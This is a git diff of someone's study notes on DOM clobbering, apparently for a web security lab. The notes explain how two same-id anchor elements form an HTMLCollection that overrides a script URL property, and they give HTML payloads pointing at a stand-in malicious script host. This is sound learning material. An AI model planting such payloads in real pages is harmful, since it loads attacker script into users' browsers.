@@ -120,8 +120,14 @@
 ```
 - To exploit the above code, you could inject the following HTML to clobber the `someObject` reference with an anchor element: `<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js`. As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the 'someObject' reference with the DOM collection. A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script.
 - I got confused here in the notes about why we had to make a collection and why a singular anchor object wasn't going to work ... well, when we use two, we create a collection. HTMLCollections has a special feature where the browser searches inside the collection for an element. So for example, a singular anchor tag, like `<a id="someObject" name ="url" href="//malicious.com">`, when JavaScript runs `someObject.url`, the browser finds the ID someObject and it returns an `HTMLAnchorElement` object. The code then tries to read the property `url` on the anchor elemnt, but does the HTML anchor tag have a standard property called `url`? No, it has `href`, `host`, `search`, but not `url`. So this causes `someObject.url` 
-  - Okay, now what do we do about this? Well, a collection behaves differently! Now, if we do: `<a id="someObject" <a id="someObject" name="url" href="//malicious.com">`. The browser now finds two elements with the same ID, it cannot just return one, so it bundles them into an `HTMLCollection` which is essentially an array. Now, the code tries to read the property `url` on the Collection, but `HTMLCollections` has a special feature. If you try to access a property on a collection (like `.url`), the browser searches inside the collection for an element with the `name="url"`. Browser logic is "do I have an element inside me named `url`? Yes! The second anchor."
-
+  - Okay, now what do we do about this? Well, a collection behaves differently! Now, if we do: `<a id="someObject"> <a id="someObject" name="url" href="//malicious.com">`. The browser now finds two elements with the same ID, it cannot just return one, so it bundles them into an `HTMLCollection` which is essentially an array. Now, the code tries to read the property `url` on the Collection, but `HTMLCollections` has a special feature. If you try to access a property on a collection (like `.url`), the browser searches inside the collection for an element with the `name="url"`. Browser logic is "do I have an element inside me named `url`? Yes! The second anchor."
+- Now it's time for the lab - we know that "safe HTML" is allowed for the comment, and we just learned about clobbering with collections. So am I able to clobber through a comment that clobbers the "website" href ... first mistake! When I take a look at the JS (shown below), the websiteElement is a local variable, not a global (hence "let"). It is able to look into the script itself to find the websiteElement, so we must look elsewhere. 
+```
+let websiteElement = document.createElement("a");
+                    websiteElement.setAttribute("id", "author");
+                    websiteElement.setAttribute("href", comment.website);
+                    firstPElement.appendChild(websiteElement)
+```
 
 
 
